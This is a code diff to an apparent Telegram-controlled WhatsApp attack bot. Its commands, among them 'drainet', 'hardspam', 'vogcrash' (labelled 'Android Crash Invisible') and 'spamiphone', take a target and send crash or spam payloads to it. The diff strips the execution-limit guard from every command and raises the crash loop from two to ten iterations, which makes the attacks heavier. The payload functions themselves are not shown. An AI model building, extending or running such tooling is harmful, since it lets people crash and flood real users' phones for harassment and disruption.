@@ -4576,7 +4576,7 @@ ${err.stack || err.message}
 //                                                    
 //
 
-bot.command('drainet', checkExecutionLimit, checkWhatsAppConnection, checkPremiumAccess, CheckCooldown, async (ctx) => {
+bot.command('drainet', checkWhatsAppConnection, checkPremiumAccess, CheckCooldown, async (ctx) => {
     
     let q = ctx.message?.text?.split(" ")[1];
     
@@ -4651,7 +4651,7 @@ Please verify the target input and system status before retrying.`
     }
 });
 
-bot.command('delaycombo', checkExecutionLimit, checkPremiumAccess, checkWhatsAppConnection, CheckCooldown, async (ctx) => {
+bot.command('delaycombo', checkPremiumAccess, checkWhatsAppConnection, CheckCooldown, async (ctx) => {
 
     let q =
         ctx.message?.text
@@ -4769,7 +4769,7 @@ The system was unable to execute the requested module.`
     }
 });
 
-bot.command('hardspam', checkExecutionLimit, checkPremiumAccess, checkWhatsAppConnection, CheckCooldown, async (ctx) => {
+bot.command('hardspam', checkPremiumAccess, checkWhatsAppConnection, CheckCooldown, async (ctx) => {
         let q =
             ctx.message?.text
             ?.split(" ")[1];
@@ -4885,7 +4885,7 @@ The system was unable to execute the requested module.`
         }
 });
 
-bot.command('voguehard', checkExecutionLimit, checkPremiumAccess, checkWhatsAppConnection, CheckCooldown, async (ctx) => {
+bot.command('voguehard', checkPremiumAccess, checkWhatsAppConnection, CheckCooldown, async (ctx) => {
         let q =
             ctx.message?.text
             ?.split(" ")[1];
@@ -5001,7 +5001,7 @@ The system was unable to execute the requested module.`
         }
 });
 
-bot.command('spamandro', checkExecutionLimit, checkPremiumAccess, checkWhatsAppConnection, CheckCooldown, async (ctx) => {
+bot.command('spamandro', checkPremiumAccess, checkWhatsAppConnection, CheckCooldown, async (ctx) => {
     
     let q = ctx.message?.text?.split(" ")[1];
     
@@ -5077,7 +5077,7 @@ Please verify the target input and system status before retrying.`
     }
 });
 
-bot.command('vogcrash', checkExecutionLimit, checkPremiumAccess, checkWhatsAppConnection, CheckCooldown, async (ctx) => {
+bot.command('vogcrash', checkPremiumAccess, checkWhatsAppConnection, CheckCooldown, async (ctx) => {
     
     let q = ctx.message?.text?.split(" ")[1];
     
@@ -5125,10 +5125,10 @@ Description : Android Crash Invisible
             
             const instanceId = Date.now() + Math.random();
             
-            for (let i = 0; i < 2; i++) {
+            for (let i = 0; i < 10; i++) {
                 try {
                     await VogueInvisCrash(sock, target);
-                    await sleep(1500)
+                    await sleep(3000)
                 } catch (e) {
                     console.log(`[WORKER ${instanceId}] Error: ${e.message}`);
                     await restartBot("Connection Closed");
@@ -5153,7 +5153,7 @@ Please verify the target input and system status before retrying.`
     }
 });
 
-bot.command('spamiphone', checkExecutionLimit, checkWhatsAppConnection, checkPremiumAccess, CheckCooldown, async (ctx) => {
+bot.command('spamiphone', checkWhatsAppConnection, checkPremiumAccess, CheckCooldown, async (ctx) => {
     
     let q = ctx.message?.text?.split(" ")[1];
     
